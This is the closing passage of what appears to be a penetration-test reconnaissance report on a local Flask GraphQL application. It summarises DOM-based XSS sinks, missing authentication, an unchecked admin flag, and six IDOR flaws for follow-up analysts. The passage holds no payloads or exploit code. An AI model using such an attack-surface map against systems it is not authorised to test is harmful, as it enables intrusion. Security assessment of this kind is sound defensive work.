- **3 DOM-based XSS sinks** in client-side rendering (scripts.js:27-30)
- No server-side template injection (Jinja2 autoescaping enabled)
- No CSP headers to mitigate XSS
- See Section 10 for sink details and render contexts

### For Auth Analysis Specialist
- **ZERO authentication mechanisms** - all endpoints public
- User model has no password field
- No session management or JWT tokens
- See Section 3 for complete absence of auth

### For Authz Analysis Specialist
- **ZERO authorization enforcement** - `is_admin` field exists but never checked
- All users have admin-equivalent access
- 6 IDOR vulnerabilities identified
- See Sections 7-8 for role architecture and escalation candidates

### For SSRF Analysis Specialist
- **No SSRF attack surface** - application makes no outbound HTTP requests
- Static MongoDB connection (not user-controllable)
- No URL parameters or external service integrations
- See Section 11 for detailed analysis

---

## RECONNAISSANCE COMPLETE

This deliverable provides a comprehensive attack surface map for the Flask GraphQL application at http://localhost:5003. All endpoints, input vectors, authorization boundaries, and injection sources have been catalogued for subsequent vulnerability analysis phases.